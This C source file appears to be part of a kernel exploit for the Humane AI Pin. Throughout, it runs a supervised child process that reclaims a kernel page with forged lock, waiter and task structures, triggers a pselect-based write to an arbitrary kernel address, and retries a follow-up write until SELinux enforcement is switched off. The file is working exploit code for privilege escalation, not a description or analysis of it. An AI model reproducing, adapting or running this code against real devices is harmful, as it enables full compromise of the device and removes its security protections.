/*
 * SPDX-License-Identifier: Apache-2.0
 * Humane AI Pin one-shot write supervisor, 2026.
 */
#include "common.h"
#include "slide_supervisor.h"

#define WRITE_TIMEOUT_MS (180ULL * 1000ULL)
#define FOLLOWUP_TIMEOUT_MS (20ULL * 60ULL * 1000ULL)

enum write_child_code {
  WRITE_CHILD_OK = 0,
  WRITE_CHILD_SETUP = 10,
  WRITE_CHILD_RECLAIM = 11,
  WRITE_CHILD_ROUTE = 12,
  WRITE_CHILD_FOLLOWUP = 13,
};

static int selinux_is_permissive(void) {
  char state[8];
  read_first_line("/sys/fs/selinux/enforce", state, sizeof(state));
  return strcmp(state, "0") == 0;
}

static void send_child_result(int fd, uint32_t code, uint64_t value) {
  struct slide_supervisor_result result = {
      .code = code,
      .value = value,
  };
  slide_supervisor_write_result(fd, &result);
}

static void child_write_route(int result_fd,
                              uintptr_t target, uintptr_t value, int shape,
                              int sequence, uintptr_t followup_target,
                              int followup_sequence, pid_t expected_parent) {
  if (setpgid(0, 0) != 0 ||
      prctl(PR_SET_PDEATHSIG, SIGKILL) != 0 ||
      getppid() != expected_parent) {
    send_child_result(result_fd, WRITE_CHILD_SETUP, errno);
    _exit(WRITE_CHILD_SETUP);
  }

  fake_task = 0;
  fake_w0 = 0;
  fake_lock = 0;
  page_base = 0;
  set_pselect_write(target, value, shape);

  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_READ);
  if (!page_base || !fake_lock || !fake_w0 || !fake_task) {
    send_child_result(result_fd, WRITE_CHILD_RECLAIM, 0);
    _exit(WRITE_CHILD_RECLAIM);
  }

  uintptr_t captured_page = page_base;
  uintptr_t captured_lock = fake_lock;
  uintptr_t captured_waiter = fake_w0;
  uintptr_t captured_task = fake_task;
  if (!prepare_skb_payload(captured_page, PAGE_PAYLOAD_WRITE) ||
      page_base != captured_page || fake_lock != captured_lock ||
      fake_w0 != captured_waiter || fake_task != captured_task) {
    send_child_result(result_fd, WRITE_CHILD_RECLAIM, 1);
    _exit(WRITE_CHILD_RECLAIM);
  }

  pr_info("write-route sequence=%d target=%016zx value=%016zx shape=%d "
          "page=%016zx\n",
          sequence, target, value, shape, page_base);
  run_main_route_threads();
  int routed = atomic_load(&route_done) &&
               atomic_load(&consumer_calls) > 0 &&
               atomic_load(&consumer_success) > 0;
  if (!routed) {
    send_child_result(result_fd, WRITE_CHILD_ROUTE, 0);
    _exit(WRITE_CHILD_ROUTE);
  }

  if (followup_target) {
    uintptr_t zero_low_byte = page_base + 0x100;
    int usable = is_direct_ptr(zero_low_byte) &&
                 (zero_low_byte & 0xff) == 0 &&
                 ((zero_low_byte >> 8) & 0xff) != 0 &&
                 ((zero_low_byte >> 16) & 0xff) != 0;
    if (!usable) {
      send_child_result(result_fd, WRITE_CHILD_FOLLOWUP, 1);
      _exit(WRITE_CHILD_FOLLOWUP);
    }

    int complete = selinux_is_permissive();
    for (int attempt = 0;
         !complete && attempt < DIRECT_FOLLOWUP_ATTEMPTS;
         ++attempt) {
      int followup_ok = direct_pselect_write_once(
          followup_target, zero_low_byte, 0,
          followup_sequence + attempt);
      complete = followup_ok && selinux_is_permissive();
    }
    if (!complete) {
      send_child_result(result_fd, WRITE_CHILD_FOLLOWUP, 2);
      _exit(WRITE_CHILD_FOLLOWUP);
    }
  }

  send_child_result(result_fd, WRITE_CHILD_OK, 1);
  _exit(0);
}

static int supervised_write(uintptr_t target, uintptr_t value, int shape,
                            int sequence, uintptr_t followup_target,
                            int followup_sequence) {
  if ((shape != 0 && shape != 1) || !is_kernel_ptr(target)) {
    errno = EINVAL;
    return 0;
  }

  int result_pipe[2];
  if (slide_supervisor_pipe(result_pipe) != 0) {
    return 0;
  }
  pid_t parent = getpid();
  pid_t child = fork();
  if (child < 0) {
    int saved = errno;
    close(result_pipe[0]);
    close(result_pipe[1]);
    errno = saved;
    return 0;
  }
  if (child == 0) {
    close(result_pipe[0]);
    child_write_route(result_pipe[1], target, value, shape, sequence,
                      followup_target, followup_sequence, parent);
  }

  close(result_pipe[1]);
  if (setpgid(child, child) != 0 && errno != EACCES && errno != ESRCH) {
    pr_warning("write supervisor setpgid child=%d errno=%d\n", child, errno);
  }

  uint64_t timeout_ms = followup_target ? FOLLOWUP_TIMEOUT_MS
                                        : WRITE_TIMEOUT_MS;
  struct timespec deadline;
  if (slide_supervisor_deadline_after_ms(&deadline, timeout_ms) != 0) {
    kill(-child, SIGKILL);
    kill(child, SIGKILL);
    close(result_pipe[0]);
    return 0;
  }

  struct slide_supervisor_result result;
  int wait_status = 0;
  enum slide_supervisor_outcome outcome = slide_supervisor_collect(
      child, result_pipe[0], &deadline, &result, &wait_status);
  if (outcome != SLIDE_SUPERVISOR_OK || result.code != WRITE_CHILD_OK) {
    pr_warning("write supervisor sequence=%d outcome=%s code=%u value=%llu "
               "status=0x%x\n",
               sequence, slide_supervisor_outcome_name(outcome), result.code,
               (unsigned long long)result.value, wait_status);
    return 0;
  }
  return 1;
}

int direct_pselect_write_once(uintptr_t target, uintptr_t value,
                              int shape, int sequence) {
  return supervised_write(target, value, shape, sequence, 0, 0);
}

int direct_pselect_write_followup_once(uintptr_t target, uintptr_t value,
                                       int shape, int sequence,
                                       uintptr_t followup_target,
                                       int followup_sequence) {
  return supervised_write(target, value, shape, sequence,
                          followup_target, followup_sequence);
}
